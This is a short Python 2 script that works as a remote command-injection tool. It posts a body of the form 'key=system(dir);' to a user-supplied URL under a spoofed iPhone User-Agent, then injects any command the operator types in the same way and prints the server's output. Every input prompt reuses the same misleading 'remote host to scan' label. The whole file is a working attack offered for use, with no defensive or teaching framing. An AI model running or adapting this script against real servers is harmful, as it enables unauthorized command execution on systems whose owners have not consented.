import urllib2

url= raw_input("Enter a remote host to scan:")
key= raw_input("Enter a remote host to scan:")


request = urllib2.Request(url,key+"=system(dir);", {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
data = urllib2.urlopen(request).read()


print data

remote_server = raw_input("Enter a remote host to scan:")
request = urllib2.Request(url,key+"=system("+remote_server+");", {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
data = urllib2.urlopen(request).read()

print data
